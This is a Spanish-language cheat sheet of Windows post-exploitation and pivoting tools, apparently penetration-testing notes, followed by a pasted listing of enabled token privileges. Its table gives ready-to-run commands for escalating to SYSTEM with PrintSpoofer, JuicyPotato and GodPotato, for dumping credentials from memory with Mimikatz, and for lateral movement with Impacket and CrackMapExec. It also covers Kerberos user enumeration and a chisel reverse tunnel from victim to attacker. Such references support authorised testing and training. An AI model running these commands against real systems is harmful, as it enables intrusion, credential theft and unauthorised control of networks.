# Tabla de Herramientas de Post-Explotación y Pivoting

| Herramienta | Descripción | Tipo de Herramienta | Sistema de instalación | Instalación | Ejemplo de Uso Realista | Privilegios requeridos |
|-------------|-------------|---------------------|------------------------|-------------|-------------------------|------------------------|
| **PrintSpoofer.exe / PrintSpoofer64.exe** | Abusa del servicio `Print Spooler` y el permiso `SeImpersonatePrivilege` para escalar a SYSTEM. | Escalación de privilegios local | Windows | Descargar desde repositorios públicos (ej. GitHub) o compilar en Visual Studio. | `PrintSpoofer64.exe -i -c cmd.exe` (Abre shell como SYSTEM) | Usuario con `SeImpersonatePrivilege` habilitado. |
| **JuicyPotato.exe** | Variante de exploit que abusa de COM y permisos especiales para escalar a SYSTEM. | Escalación de privilegios local | Windows | Descargar binario o compilar desde código fuente. | `JuicyPotato.exe -l 1337 -p cmd.exe -t *` (Eleva a SYSTEM) | `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege`. |
| **GodPotato.exe / GodPotato-NEI2.exe** | Variante mejorada de JuicyPotato que funciona en versiones más recientes de Windows. | Escalación de privilegios local | Windows | Descargar binario listo desde GitHub. | `GodPotato.exe -cmd "cmd /c whoami"` | `SeImpersonatePrivilege`. |
| **RogueWinRM.exe** | Permite ejecutar comandos remotos como SYSTEM a través de WinRM cuando se tienen privilegios. | Ejecución remota | Windows | Descargar binario desde GitHub o compilar. | `RogueWinRM.exe -H <victima_ip> -u usuario -p contraseña -c "powershell.exe"` | WinRM habilitado y credenciales válidas. |
| **sh6789.exe** | Script/binario personalizado para ejecución de payloads en Windows. | Ejecución de payloads | Windows | Copiar en la máquina víctima. | `sh6789.exe` | Depende del payload; normalmente requiere ejecución local. |
| **BloodHound** | Herramienta de análisis de Active Directory que permite descubrir rutas de ataque. | Reconocimiento y escalación lateral | Windows/Linux | Instalar desde GitHub (`npm install` para interfaz gráfica, `SharpHound` para recolección). | `SharpHound.exe -c All` y luego analizar con GUI. | Usuario con acceso al dominio. |
| **Mimikatz** | Extrae credenciales en texto plano, hashes y tickets Kerberos desde memoria. | Post-explotación / extracción de credenciales | Windows | Descargar desde GitHub o binarios precompilados. | `mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"` | Usuario con privilegio `SeDebugPrivilege` (normalmente admin local). |
| **Impacket** | Conjunto de scripts Python para interactuar con protocolos de red (SMB, RDP, etc.). | Post-explotación / movimiento lateral | Linux | `pip install impacket` | `psexec.py usuario@victima` | Credenciales válidas y acceso a puertos necesarios. |
| **Kerbrute** | Fuerza bruta o enumera usuarios en Kerberos. | Reconocimiento | Windows/Linux | Descargar desde GitHub (Go) o binario precompilado. | `kerbrute userenum -d dominio.local users.txt` | No requiere privilegios especiales; solo acceso a KDC (puerto 88). |
| **CrackMapExec (CME)** | Automatiza pruebas en redes Windows (SMB, WinRM, RDP). | Post-explotación / movimiento lateral | Linux | `pipx install crackmapexec` | `cme smb 192.168.1.0/24 -u usuario -p contraseña` | Credenciales válidas. |
| **smbclient** | Cliente SMB para acceder a recursos compartidos. | Acceso a compartidos SMB | Linux | `sudo apt install smbclient` | `smbclient //192.168.1.10/compartido -U usuario` | Credenciales válidas o acceso anónimo. |
| **rpcclient** | Cliente RPC para consultar información de Windows. | Enumeración | Linux | `sudo apt install samba-common-bin` | `rpcclient -U "" -N 192.168.1.10` | Acceso anónimo o credenciales válidas. |
| **proxychains** | Encadena conexiones a través de proxies/Tor. | Pivoting / tunneling | Linux | `sudo apt install proxychains` | `proxychains nmap -Pn 10.10.10.10` | No requiere privilegios especiales. |
| **chisel** | Túnel TCP/UDP rápido sobre HTTP. | Pivoting / tunneling | Windows/Linux | Descargar desde GitHub o binario precompilado. | `chisel server -p 8000 --reverse` (atacante) y `chisel client atacante_ip:8000 R:8080:127.0.0.1:80` (víctima) | Ejecución en ambos extremos; no requiere privilegios especiales. |




Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session 